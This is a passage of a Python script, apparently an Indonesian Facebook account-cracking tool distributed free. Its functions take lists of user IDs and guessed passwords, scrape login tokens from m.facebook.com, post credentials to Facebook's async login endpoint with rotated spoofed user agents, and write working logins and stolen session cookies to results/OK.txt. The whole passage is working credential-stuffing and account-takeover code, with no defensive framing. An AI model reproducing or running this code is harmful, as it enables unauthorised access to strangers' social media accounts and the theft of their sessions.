rame%3Df17ac83e7cbbd54%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
                 data = {
                    "m_ts": re.search('name="m_ts" value="(.*?)"', str(link.text)).group(1),
                    "li": re.search('name="li" value="(.*?)"', str(link.text)).group(1),
                    "try_number": "0",
                    "unrecognized_tries": "0",
                    "email": user,
                    "prefill_contact_point": f"{user} {pw}",
                    "prefill_source": "browser_dropdown",
                    "prefill_type": "password",
                    "first_prefill_source": "browser_dropdown",
                    "first_prefill_type": "contact_point",
                    "had_cp_prefilled": True,
                    "had_password_prefilled": True,
                    "is_smart_lock": False,
                    "bi_xrwh": re.search('name="bi_xrwh" value="(.*?)"', str(link.text)).group(1),
                    "bi_wvdp": '{"hwc":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":false,"has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":false,"has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
                    "encpass": f"#PWD_BROWSER:0:{str(mek()).split('.')[0]}:{pw}",
                    "jazoest": re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
                    "lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1)
                
                 }
                 head = {"Host": "m.facebook.com",
"content-length": "2167",
"x-fb-lsd": "AVr_CQw1Ahg",
"sec-ch-ua-mobile": "?0",
"user-agent": uaku,
"sec-ch-ua-platform": "Android",
"content-type": "application/x-www-form-urlencoded",
"accept": "*/*",
"origin": "https://m.facebook.com",
"sec-fetch-site": "same-origin",
"sec-fetch-mode": "cors",
"sec-fetch-dest": "empty",
"referer": "https://m.facebook.com/login.php?skip_api_login=1&api_key=467287944163459&kid_directed_site=0&app_id=467287944163459&signed_next=1&next=https%3A%2F%2Fweb.facebook.com%2Fconnect%2Fuiserver.php%3Fapp_id%3D467287944163459%26next%3Dhttps%253A%252F%252Fm.facebook.com%252Fv11.0%252Fdialog%252Foauth%253Fapp_id%253D467287944163459%2526cbt%253D1673719295759%2526channel_url%253Dhttps%25253A%25252F%25252Fstaticxx.facebook.com%25252Fx%25252Fconnect%25252Fxd_arbiter%25252F%25253Fversion%25253D46%252523cb%25253Dfe745d234eac24%252526domain%25253Dm.hoyolab.com%252526is_canvas%25253Dfalse%252526origin%25253Dhttps%2525253A%2525252F%2525252Fm.hoyolab.com%2525252Ff109ef53f2aeac4%252526relation%25253Dopener%2526client_id%253D467287944163459%2526display%253Dtouch%2526domain%253Dm.hoyolab.com%2526e2e%253D%25257B%25257D%2526fallback_redirect_uri%253Dhttps%25253A%25252F%25252Fm.hoyolab.com%25252F%252523%25252Fcircles%25252F1%25252F0%25252Ffeed%2526locale%253Did_ID%2526logger_id%253Df100a0052c68adc%2526origin%253D2%2526redirect_uri%253Dhttps%25253A%25252F%25252Fstaticxx.facebook.com%25252Fx%25252Fconnect%25252Fxd_arbiter%25252F%25253Fversion%25253D46%252523cb%25253Df1dd33ac639ff24%252526domain%25253Dm.hoyolab.com%252526is_canvas%25253Dfalse%252526origin%25253Dhttps%2525253A%2525252F%2525252Fm.hoyolab.com%2525252Ff109ef53f2aeac4%252526relation%25253Dopener%252526frame%25253Df17ac83e7cbbd54%2526response_type%253Dtoken%25252Csigned_request%25252Cgraph_domain%2526sdk%253Djoey%2526version%253Dv11.0%2526ret%253Dlogin%2526fbapp_pres%253D0%2526tp%253Dunspecified%26display%3Dtouch%26cancel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1dd33ac639ff24%2526domain%253Dm.hoyolab.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fm.hoyolab.com%25252Ff109ef53f2aeac4%2526relation%253Dopener%2526frame%253Df17ac83e7cbbd54%2526error%253Daccess_denied%2526error_code%253D200%2526error_description%253DPermissions%252Berror%2526error_reason%253Duser_denied%26return_session%3D0%26canvas%3D0%26method%3Dpermissions.request&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df1dd33ac639ff24%26domain%3Dm.hoyolab.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fm.hoyolab.com%252Ff109ef53f2aeac4%26relation%3Dopener%26frame%3Df17ac83e7cbbd54%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr",
"accept-encoding": "gzip, deflate, br",
"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6,zh-CN;q=0.5,zh;q=0.4,ta;q=0.3,es;q=0.2,vi;q=0.1"}
                 r = requ.post("https://m.facebook.com/login/device-based/login/async/?api_key=467287944163459&auth_token=0058d0723d812a37f1ea27c25de2f168&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fweb.facebook.com%2Fconnect%2Fuiserver.php%3Fapp_id%3D467287944163459%26next%3Dhttps%253A%252F%252Fm.facebook.com%252Fv11.0%252Fdialog%252Foauth%253Fapp_id%253D467287944163459%2526cbt%253D1673719295759%2526channel_url%253Dhttps%25253A%25252F%25252Fstaticxx.facebook.com%25252Fx%25252Fconnect%25252Fxd_arbiter%25252F%25253Fversion%25253D46%252523cb%25253Dfe745d234eac24%252526domain%25253Dm.hoyolab.com%252526is_canvas%25253Dfalse%252526origin%25253Dhttps%2525253A%2525252F%2525252Fm.hoyolab.com%2525252Ff109ef53f2aeac4%252526relation%25253Dopener%2526client_id%253D467287944163459%2526display%253Dtouch%2526domain%253Dm.hoyolab.com%2526e2e%253D%25257B%25257D%2526fallback_redirect_uri%253Dhttps%25253A%25252F%25252Fm.hoyolab.com%25252F%252523%25252Fcircles%25252F1%25252F0%25252Ffeed%2526locale%253Did_ID%2526logger_id%253Df100a0052c68adc%2526origin%253D2%2526redirect_uri%253Dhttps%25253A%25252F%25252Fstaticxx.facebook.com%25252Fx%25252Fconnect%25252Fxd_arbiter%25252F%25253Fversion%25253D46%252523cb%25253Df1dd33ac639ff24%252526domain%25253Dm.hoyolab.com%252526is_canvas%25253Dfalse%252526origin%25253Dhttps%2525253A%2525252F%2525252Fm.hoyolab.com%2525252Ff109ef53f2aeac4%252526relation%25253Dopener%252526frame%25253Df17ac83e7cbbd54%2526response_type%253Dtoken%25252Csigned_request%25252Cgraph_domain%2526sdk%253Djoey%2526version%253Dv11.0%2526ret%253Dlogin%2526fbapp_pres%253D0%2526tp%253Dunspecified%26display%3Dtouch%26cancel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1dd33ac639ff24%2526domain%253Dm.hoyolab.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fm.hoyolab.com%25252Ff109ef53f2aeac4%2526relation%253Dopener%2526frame%253Df17ac83e7cbbd54%2526error%253Daccess_denied%2526error_code%253D200%2526error_description%253DPermissions%252Berror%2526error_reason%253Duser_denied%26return_session%3D0%26canvas%3D0%26method%3Dpermissions.request&refsrc=deprecated&app_id=467287944163459&cancel=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df1dd33ac639ff24%26domain%3Dm.hoyolab.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fm.hoyolab.com%252Ff109ef53f2aeac4%26relation%3Dopener%26frame%3Df17ac83e7cbbd54%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&lwv=100", data=data, headers=head, allow_redirects=False)
                 if 'c_user' in ses.cookies.get_dict():
                     ok.append(user)
                     coki = ";".join([str(x)+'='+str(i) for x,i in ses.cookies.get_dict().items()])
                     tree = Tree("")
                     tree.add(f"{H2}{user}|{pw}")
                     tree.add(f"{H2}{coki} | {ua}")
                     prints(tree)
                     open('results/OK.txt','a').write(f"{user}|{pw}|{coki}\n")
                     break
                 elif 'checkpoint' in ses.cookies.get_dict():
                     cp.append(user)
                     tree = Tree("")
                     tree.add(f"{K2}{user}|{pw}")
                     prints(tree)
                     open('results/CP.txt','a').write(f"{user}|{pw}\n")
                     break
                 else:
                     continue
             except requests.exceptions.ConnectionError:
                 time.sleep(15)
        loop +=1
    
    def ugentku(self):
        self.rr = random.randint
        self.rc = random.choice
        self.versi_androi = self.rc(["4.1.1","2.3.6","4.0.3","2.3.3","4.0.4","4.1","2.2.1"])
        self.versi_presto = str(self.rr(0,2))+"."+str(self.rr(0,11))+"."+str(self.rr(300,399))
        self.adrr = "ADR-"+str(self.rr(1000000000,9000000000))
        self.versii = "12.10"
        self.builedd = "PPR1."+str(self.rr(111111,199999))+".011"
        self.userr1 = f"Dalvik/2.1.0 (Linux; U; Android {str(self.rr(7,12))}; Redmi Note 8T MIUI/V11.0.11.0.PCXEUXM) [FBAN/Orca-Android;FBAV/{str(self.rr(200,399))}.0.0.{str(self.rr(0,99))}.{str(self.rr(100,150))};FBPN/com.facebook.orca;FBLC/pl_PL;FBBV/{str(self.rr(200000000,900000000))};FBCR/PLAY (T-Mobile);FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 8T;FBSV/{str(self.rr(7,12))};FBCA/arm64-v8a:null;FBDM/"+"{density=2.75,width=1080,height=2130};FB_FW/1;] FBBK/1"
        self.userr2 = f"Dalvik/2.1.0 (Linux; U; Android {str(self.rr(7,12))}; Nokia 1 Plus Build/{self.builedd})"
        self.userr3 = f"Opera/9.80 (Android {self.versi_androi}; Linux; Opera Mobi/{self.adrr}) Presto/{self.versi_presto} Version/{self.versii}"
        self.usermain = self.rc([self.userr1, self.userr2, self.userr3])
        return self.usermain
    
    def metodeASYNC(self, user, pwx):
        global ok ,cp, loop
        self.warnn = random.choice([H2, K2, J2, B2, O2, N2, A2, U2])
        ua = self.ugentku()
        prog.update(des,description=f"[ {self.warnn}Async{P2} ] {self.warnn}{loop}/{len(ID)}{P2} Live-:{H2}{len(ok)} {P2}Check-:{K2}{len(cp)}")
        prog.advance(des)
        for pw in pwx:
             try:
                 if 'uadia' in uadarimu: ua = uadia[0]
                 else: ua
                 uaku = random.choice(["Mozilla/5.0 (Linux; Android 11; TECNO BD4h Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.79 Mobile Safari/537.36","com.google.android.apps.searchlite/570325 (Linux; U; Android 11; ar_MA; TECNO BD4h; Build/RP1A.200720.011; Cronet/108.0.5359.47)","Mozilla/5.0 (Linux; Android 11; TECNO BD4h Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.128 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; TECNO BD4h) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; TECNO BD4j Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; TECNO BD4j Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.79 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/332.0.0.22.108;]","Mozilla/5.0 (Linux; Android 11; TECNO BD4h Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/378.0.0.18.112;]","Mozilla/5.0 (Linux; Android 11; TECNO BD4j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36 OPR/68.2.3557.64219"])
                 ses = requests.Session()
                 link = ses.get("https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8")
                 data = {
                    "m_ts": re.search('name="m_ts" value="(.*?)"', str(link.text)).group(1),
                    "li": re.search('name="li" value="(.*?)"', str(link.text)).group(1),
                    "try_number": "0",
                    "unrecognized_tries": "0",
                    "email": user,
                    "prefill_contact_point": f"{user} {pw}",
                    "prefill_source": "browser_dropdown",
                    "prefill_type": "password",
                    "first_prefill_source": "browser_dropdown",
                    "first_prefill_type": "contact_point",
                    "had_cp_prefilled": True,
                    "had_password_prefilled": True,
                    "is_smart_lock": False,
                    "bi_xrwh": re.search('name="bi_xrwh" value="(.*?)"', str(link.text)).group(1),
                    "bi_wvdp": '{"hwc":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":false,"has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":false,"has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
                    "encpass": f"#PWD_BROWSER:0:{str(TimeAdtya()).split('.')[0]}:{pw}",
                    "jazoest": re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
                    "lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1)
                
                 }
                 head = {
                    "Host": "m.facebook.com",
                    "content-length": f"{str(len(data))}",
                    "x-fb-lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
                    "user-agent": ua,
                    "content-type": "application/x-www-form-urlencoded",
                    "accept": "*/*",
                    "origin": "https://m.facebook.com",
                    "x-requested-with": "mark.via.gp",
                    "sec-fetch-site": "same-origin",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-dest": "empty",
                    "referer": "https://m.facebook.com/login/?ref=dbl&fl&login_from_aymh=1",
                    "accept-encoding": "gzip, deflate",
                    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
                    }
                 r = ses.post("https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100", data = data, headers = head, allow_redirects=False)
                 if 'c_user' in ses.cookies.get_dict():
                     ok.append(user)
                     coki = ";".join([str(x)+'='+str(i) for x,i in ses.cookies.get_dict().items()])
                     tree = Tree(f"{P2}LIVE {H2}{days} {reall} {year}")
                     tree.add(Panel.fit(f"{H2}{user}|{pw}",style=f"#AAAAAA")).add(Panel.fit(f"{H2}{coki} | {ua}",style=f"#AAAAAA"))
                     prints(tree)
                     open('results/OK.txt','a').write(f"{user}|{pw}|{coki}\n")
                     break
                 elif 'checkpoint' in ses.cookies.get_dict():
                     cp.append(user)
                     tree = Tree(f"{P2}CHEK {K2}{days} {reall} {year}")
                     tree.add(Panel.fit(f"{K2}{user}|{pw}",style=f"#AAAAAA")).add(Panel.fit(f"{K2}{ua}",style=f"#AAAAAA"))
                     prints(tree)
                     open('results/CP.txt','a').write(f"{user}|{pw}\n")
                     break
                 else:
                     continue
             except requests.exceptions.ConnectionError:
                 time.sleep(15)
        loop +=1

if __name__ == '__main__':
   try:os.system("git pull")
   except:pass
   try:os.mkdir("results")
   except:pass
   try:os.mkdir("data")
   except:pass
   MulaiTools()

##--------------[ SCRIPT FREE JANGAN DI JUAL BELIKAN! ]--------------##